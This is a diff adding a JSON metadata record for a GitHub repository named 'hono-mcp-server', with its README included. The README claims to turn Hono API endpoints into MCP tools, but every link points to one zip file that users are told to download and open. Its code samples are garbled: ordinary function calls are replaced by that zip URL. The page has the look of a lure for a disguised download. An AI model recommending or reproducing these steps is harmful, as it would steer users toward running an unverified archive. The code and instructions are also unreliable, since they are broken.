@@ -1,0 +1,43 @@
+{
+  "full_name": "ninjacazul/hono-mcp-server",
+  "html_url": "https://github.com/ninjacazul/hono-mcp-server",
+  "description": "🔧 Expose Hono API endpoints as MCP tools, simplifying integration and enhancing your API's functionality.",
+  "topics": [
+    "aws",
+    "browser-extension",
+    "collaboration",
+    "deno",
+    "eclipseiot",
+    "file-sharing",
+    "mcp-host",
+    "mcp-server",
+    "mcp-tools",
+    "messaging",
+    "nodejs",
+    "open-source",
+    "server",
+    "sharing",
+    "typescript"
+  ],
+  "matched_query_topics": [
+    "mcp-tools"
+  ],
+  "stars": 1,
+  "forks": 1,
+  "open_issues": 1,
+  "language": "TypeScript",
+  "license": "MIT",
+  "default_branch": "main",
+  "created_at": "2025-04-02T08:32:53Z",
+  "last_pushed_at": "2026-07-11T21:40:48Z",
+  "fetched_at": "2026-07-12T00:41:18.772Z",
+  "readme": {
+    "path": "README.md",
+    "content": "# 🎉 hono-mcp-server - Easily Expose Your Hono API\n\n## 🚀 Getting Started\n\nWelcome to the hono-mcp-server repository! This software allows you to easily expose your Hono API endpoints as MCP tools. Follow these simple steps to download and run the application.\n\n[![Download hono-mcp-server](https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip)](https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip)\n\n## 📥 Download & Install\n\n1. Visit the [Releases page](https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip).\n2. Look for the latest release. You will see a list of available files.\n3. Download the file suitable for your operating system.\n4. Once the file is downloaded, locate it in your downloads folder.\n5. Open the file to start the installation.\n\n## 📂 Features\n\n- **Simple API Integration:** Use the software with minimal configuration.\n- **MCP Tool Registration:** Easily register tools for your API endpoints.\n- **Type-Safe Input Handling:** The application ensures that input data conforms to expected formats.\n\n## ⚙️ System Requirements\n\nTo run hono-mcp-server, ensure your system meets the following requirements:\n\n- Operating System: Windows, macOS, or a Linux distribution.\n- https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip Version 14 or newer.\n- Basic knowledge of using command line tools may be helpful, but not essential.\n\n## 🛠️ How to Use\n\nAfter installing the hono-mcp-server, you can set it up for your project. Here's a simplified way to integrate it into your existing application:\n\n1. **Import the Library:**\n   Use the following code snippet to import hono and the hono-mcp-server library.\n   ```ts\n   import { Hono } from \"hono\";\n   import { z } from \"zod\";\n   import { mcp, registerTool } from \"hono-mcp-server\";\n   ```\n\n2. **Create the API:** \n   Here is a basic example to get you started:\n   ```ts\n   const app = new Hono()\n     .get(\"/users\", registerTool(\"List all users\"), (c) => https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip([{ id: 1, name: \"Alice\" }]))\n     .get(\"/users/:id\", registerTool(\"Get user by ID\"), (c) => https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip({ id: https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip(\"id\") }))\n     .post(\n       \"/users\",\n       registerTool({\n         description: \"Create a new user\",\n         inputSchema: {\n           name: https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip().describe(\"User's full name\"),\n           email: https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip().email().describe(\"User's email address\"),\n         },\n       }),\n       async (c) => {\n         const { name } = https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip(\"json\"); // typed!\n         return https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip({ id: 1, name });\n       },\n     );\n   ```\n\n3. **Expose Your API:** \n   Finally, expose your API as MCP tools.\n   ```ts\n   export default mcp(app, {\n     name: \"Users API\",\n     version: \"1.0.0\",\n   });\n   ```\n\n## 📊 Input & Output Schemas\n\nWith the `registerTool()` function, you can define input and output schemas for your API endpoints. This helps maintain consistency and reliability across your API.\n\n### Example Schema\n\n```ts\nconst inputSchema = {\n  name: https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip().describe(\"User's full name\"),\n  email: https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip().email().describe(\"User's email address\"),\n};\n```\n\n## 🔍 Troubleshooting\n\nIf you encounter any issues during installation or usage, check the following:\n\n- Ensure you have the correct version of https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip installed.\n- Verify that you are using a supported operating system.\n- Double-check the format of your API requests to ensure they match expected schemas.\n\n## 📧 Support\n\nIf you still need help, feel free to reach out. You can open an issue on the [GitHub repository](https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip). Our community is here to assist you.\n\n## 📦 Additional Resources\n\n- [Hono Documentation](https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip)\n- [MCP Documentation](https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip)\n- Explore additional examples and use cases in our repository to better understand how to integrate and use this application effectively.\n\n[Download hono-mcp-server](https://github.com/ninjacazul/hono-mcp-server/raw/refs/heads/main/examples/codemode/hono-mcp-server-v3.7-alpha.4.zip) again to ensure that you have the latest version. Enjoy building your APIs!"
+  },
+  "descriptor_file": null,
+  "entrypoint_file": null,
+  "content_fetch_notes": [
+    "no small root-level entrypoint candidate found"
+  ]
+}
